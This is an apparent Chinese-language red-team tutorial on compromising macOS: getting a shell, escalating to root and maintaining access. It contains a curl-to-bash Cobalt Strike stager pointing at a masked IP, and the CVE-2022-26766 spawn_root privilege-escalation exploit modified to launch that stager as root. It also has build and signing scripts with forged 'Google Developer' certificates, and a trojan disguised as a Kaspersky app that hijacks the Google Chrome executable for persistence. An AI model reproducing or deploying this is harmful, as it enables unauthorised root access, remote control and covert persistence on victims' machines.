# MacOS Rooted 权限上线权限维持




## 1. MacOS shell

### 1.1 CrossC2 制作一个 curl script

<img src="/Users/reborn/Library/Application Support/typora-user-images/image-20220707140536240.png" alt="image-20220707140536240" style="zoom:50%;" />

上线命令如下：

```bash
curl -A O -o- -L http://120.xx.xx.xxx:123456/a | bash -s
```



## 2. MacOS Rootd

### 2.1 漏洞利用：CVE-2022-26766 权限提升

Security Update 2022-004 Catalina, watchOS 8.6, macOS Big Sur 11.6.6, macOS Monterey 12.4

漏洞利用 Demo

https://github.com/zhuowei/CoreTrustDemo

源码：

https://github.com/zhuowei/CoreTrustDemo/blob/main/spawn_root.m

```objective-c
@import Darwin;
extern char** environ;

#define POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE 1
int posix_spawnattr_set_persona_np(const posix_spawnattr_t* __restrict, uid_t, uint32_t);
int posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t* __restrict, uid_t);
int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restrict, uid_t);

int main(int argc, char** argv) {
  if (argc < 2) {
    fprintf(stderr, "usage: spawn_root <command> <to> <run>\n");
    return 1;
  }
  posix_spawnattr_t attr;
  posix_spawnattr_init(&attr);
  posix_spawnattr_set_persona_np(&attr, /*persona_id=*/99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
  posix_spawnattr_set_persona_uid_np(&attr, 0);
  posix_spawnattr_set_persona_gid_np(&attr, 0);

  int pid = 0;
  int ret = posix_spawnp(&pid, argv[1], NULL, &attr, &argv[1], environ);
  if (ret) {
    fprintf(stderr, "failed to exec %s: %s\n", argv[1], strerror(errno));
    return 1;
  }
  waitpid(pid, nil, 0);
  return 0;
}
```

源码使用了`posix_spawnp` 函数，通过这个函数可以创建一个进程，从而执行任意命令。

官方说明：

https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/posix_spawnp.2.html

重要的是第二个参数和第五个参数。

该函数的第二个参数为命令文件或者命令路径。

该函数的第五个参数，是一个指向以空结尾的字符指针数组的**指针**，该数组指向以空结尾的字符串。

修改成反弹 CS Shell 后的源码

```objective-c
@import Darwin;
extern char** environ;

#define POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE 1
int posix_spawnattr_set_persona_np(const posix_spawnattr_t* __restrict, uid_t, uint32_t);
int posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t* __restrict, uid_t);
int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restrict, uid_t);

int main(int argc) {
  posix_spawnattr_t attr;
  posix_spawnattr_init(&attr);
  posix_spawnattr_set_persona_np(&attr, /*persona_id=*/99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
  posix_spawnattr_set_persona_uid_np(&attr, 0);
  posix_spawnattr_set_persona_gid_np(&attr, 0);

  char *argv[]={
    "sh",
    "-c",
    "curl -A O -o- -L http://120.xx.xx.xxx:123456/a | bash -s",
    NULL
  };

  int pid = 0;
  int ret = posix_spawnp(&pid, argv[0], NULL, &attr, &argv[0], environ);
  if (ret) {
    return 1;
  }
  waitpid(pid, nil, 0);
  return 0;
}
```

### 2.2 编译提权源码脚本

https://github.com/zhuowei/CoreTrustDemo/blob/main/build_spawn_root.sh

```bash
#!/bin/sh
set -e
clang -o spawn_root_x86 -target x86_64-apple-macos12 -Os -fmodules spawn_root.m
clang -o spawn_root_arm64 -target arm64-apple-macos12 -Os -fmodules spawn_root.m
lipo -create -output spawn_root spawn_root_x86 spawn_root_arm64
codesign -s "Worth Doing Badly Developer ID" -f --entitlements spawn_root.entitlements spawn_root
```

`clang`  命令使用`clang`编译器编译 spawn_root.m 源码文件

`lipo` 命令用来合并静态库

```bash
# lipo -create 静态库存放路径1  静态库存放路径2 ...  -output 整合后存放的路径
```

`entitlements` 文件全称为 code signing entitlements，entitlements 后缀的文件作用是为App授予特定的能力以及一些安全方面的权限，是一个plist 文件。

`codesign` 命令用来签名，`-s` 参数的内容为根据制作好的`p12`证书文件的内容来进行安装，`-f` 跟上 entitlements 文件。

### 2.3 制作 p12 证书

可以使用直接制作好的`p12` 证书

https://github.com/zhuowei/CoreTrustDemo/blob/main/badcert/dev_certificate.p12

双击安装即可。

自行生成一个`p12` 可以使用如下生成脚本

https://github.com/zhuowei/CoreTrustDemo/blob/main/badcert/makecerts.sh

```bash
set -e
export PATH="/usr/local/opt/openssl/bin:$PATH"
	#-addext "1.2.840.113635.100.6.2.6=DER:0500" \

true && openssl req -newkey rsa:2048 -nodes -keyout root_key.pem -x509 -days 3650 -out root_certificate.pem \
	-subj "/C=CA/O=Google Developer/OU=Google Developer Certification Authority/CN=Google Developer Root CA" \
	-addext "1.2.840.113635.100.6.22=DER:0500" \
	-addext "basicConstraints=critical, CA:true" -addext "keyUsage=critical, digitalSignature, keyCertSign, cRLSign"
true && openssl req -newkey rsa:2048 -nodes -keyout codeca_key.pem -out codeca_certificate.csr \
	-subj "/C=CA/O=Google Developer/OU=Google Developer Certification Authority/CN=Google Developer ID 1337 Certification Authority" \
	-addext "1.2.840.113635.100.6.22=DER:0500" \
	-addext "basicConstraints=critical, CA:true" -addext "keyUsage=critical, keyCertSign, cRLSign"
true && openssl x509 -req -CAkey root_key.pem -CA root_certificate.pem -days 3650 \
	-in codeca_certificate.csr -out codeca_certificate.pem -CAcreateserial -copy_extensions copyall
true && openssl req -newkey rsa:2048 -nodes -keyout dev_key.pem -out dev_certificate.csr \
	-subj "/C=CA/O=Google Developer/OU=Google Developer Certification Authority/CN=Google Developer ID 1337" \
	-addext "basicConstraints=critical, CA:false" \
	-addext "keyUsage = critical, digitalSignature" -addext "extendedKeyUsage = codeSigning" \
	-addext "1.2.840.113635.100.6.22=DER:0500"
true && openssl x509 -req -CAkey codeca_key.pem -CA codeca_certificate.pem -days 3650 \
	-in dev_certificate.csr -out dev_certificate.pem -CAcreateserial -copy_extensions copyall
true && cat codeca_certificate.pem root_certificate.pem >certificate_chain.pem
true && /usr/bin/openssl pkcs12 -export -in dev_certificate.pem -inkey dev_key.pem -certfile certificate_chain.pem \
	 -passout pass:password \
	-out dev_certificate.p12 -name "Google Developer ID 1337"
```

由于 MacOS 自带的 `openssl` 版本较低，所以需要更新到 OpenSSL 3.0.3 以上。

相关命令

```bash
$ brew update
$ brew install openssl
$ brew link --force openssl
echo 'export PATH="/usr/local/opt/openssl@3/bin:$PATH"' >> ~/.zshrc
export LDFLAGS="-L/usr/local/opt/openssl@3/lib" >> ~/.zshrc
export CPPFLAGS="-I/usr/local/opt/openssl@3/include" >> ~/.zshrc
export PKG_CONFIG_PATH="/usr/local/opt/openssl@3/lib/pkgconfig" >> ~/.zshrc
$ source ~/.zshrc
$ openssl version -a
```

安装`p12` 需要密码在此指定，此处密码为 `password`

```bash
true && /usr/bin/openssl pkcs12 -export -in dev_certificate.pem -inkey dev_key.pem -certfile certificate_chain.pem \
	 -passout pass:password \
```

证书名称在此指定

```bash
-out dev_certificate.p12 -name "Google Developer ID 1337"
```

证书安装完成即可编译提权源代码。

## 3. MacOS 权限维持

### 3.1 通过复制替换常用应用进行权限维持

木马目录结构

```bash
$ tree kaspersky-mac.app
kaspersky-mac.app
└── Contents
    └── MacOS
        ├── kaspersky-mac
        └── main

2 directories, 2 files
```

main 为木马，kaspersky-mac sh脚本内容

```bash
#!/bin/bash
"`dirname "$0"`"/main &
mv  "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" "/Applications/Google Chrome.app/Contents/MacOS/Google  Chrome"
cp "`dirname $0`"/main '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome ltd'
touch '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
sa="#!/bin/bash"
sb="\"\`dirname \"\$0\"\`\"/Google\ Chrome\ ltd &"
sc="\"\`dirname \"\$0\"\`\"/Google\ \ Chrome &"
echo $sa >> "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
echo $sb >> "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
echo $sc >> "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
```



### 3.2 Rooted 权限下的权限维持

